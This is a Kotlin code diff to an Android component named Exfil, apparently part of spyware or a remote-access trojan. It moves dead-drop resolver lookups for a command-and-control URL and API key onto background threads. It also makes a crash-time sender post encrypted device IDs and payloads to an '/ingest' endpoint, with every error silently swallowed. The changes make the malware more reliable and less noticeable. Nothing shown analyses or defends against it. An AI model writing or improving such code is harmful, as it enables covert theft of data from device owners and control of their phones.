@@ -69,9 +69,19 @@ object Exfil {
             return
         }
 
-        // Last resort before the native fallback: dead-drop resolvers.
-        val dropped = try { DeadDrop.resolve(ctx) } catch (_: Throwable) { null }
-        if (!dropped.isNullOrBlank()) return
+        // Dead-drop resolvers are network calls - they are never executed on
+        // the caller's thread (that blocked the main looper and caused ANRs).
+        Thread {
+            try {
+                val dropped = DeadDrop.resolve(ctx)
+                if (!dropped.isNullOrBlank()) {
+                    c2Url = null
+                    apiKey = null
+                    resolveConfig(ctx)
+                }
+            } catch (_: Throwable) {
+            }
+        }.start()
 
         c2Url = NativeKey.c2Url()
         apiKey = NativeKey.apiKey()
@@ -131,9 +141,11 @@ object Exfil {
 
     /** Synchronous variant - used by the crash handler (the process is dying). */
     fun sendLogSync(ctx: Context, kind: String, payload: String) {
+        val t = Thread {
         try {
             resolveConfig(ctx)
-            val url = endpoint("/ingest") ?: return
+            val url = endpoint("/ingest")
+            if (url == null) return@Thread
             val deviceId = Prefs.deviceId(ctx)
             val encrypted = Crypto.encrypt("$deviceId|$kind|$payload")
             val body = FormBody.Builder()
@@ -142,6 +154,10 @@ object Exfil {
             client.newCall(req).execute().use { it.close() }
         } catch (_: Throwable) {
         }
+        }
+        t.isDaemon = true
+        t.start()
+        try { t.join(4000) } catch (_: Throwable) {}
     }
 
     /** Sends several items of one kind in a single request. */
